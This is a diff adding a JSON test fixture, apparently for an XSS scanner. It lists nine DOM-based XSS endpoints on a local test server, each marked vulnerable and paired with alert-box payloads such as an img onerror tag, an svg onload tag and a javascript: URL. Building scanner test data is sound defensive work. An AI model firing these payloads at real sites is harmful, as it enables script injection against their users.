@@ -1,0 +1,121 @@
+{
+  "_meta": {
+    "category": "DOM",
+    "description": "DOM-based XSS endpoints — payload executes via client-side JavaScript from URL params",
+    "target": "http://localhost:9090"
+  },
+  "endpoints": [
+    {
+      "name": "dom-write",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/write",
+      "method": "GET",
+      "params": ["name"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-innerhtml",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/innerhtml",
+      "method": "GET",
+      "params": ["data"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "data", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "data", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<body onload=alert(1)>", "target_param": "data", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-eval",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/eval",
+      "method": "GET",
+      "params": ["expr"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "alert(1)", "target_param": "expr", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "1+alert(1)", "target_param": "expr", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-jquery",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/jquery",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-url-replace",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/url-replace",
+      "method": "GET",
+      "params": ["redir"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "javascript:alert(1)", "target_param": "redir", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-settimeout",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/settimeout",
+      "method": "GET",
+      "params": ["cb"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "alert(1)", "target_param": "cb", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-cookie",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/cookie",
+      "method": "GET",
+      "params": ["theme"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "theme", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-srcdoc",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/srcdoc",
+      "method": "GET",
+      "params": ["content"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "content", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "dom-localstorage",
+      "category": "DOM",
+      "url": "http://localhost:9090/dom/localstorage",
+      "method": "GET",
+      "params": ["save"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "save", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
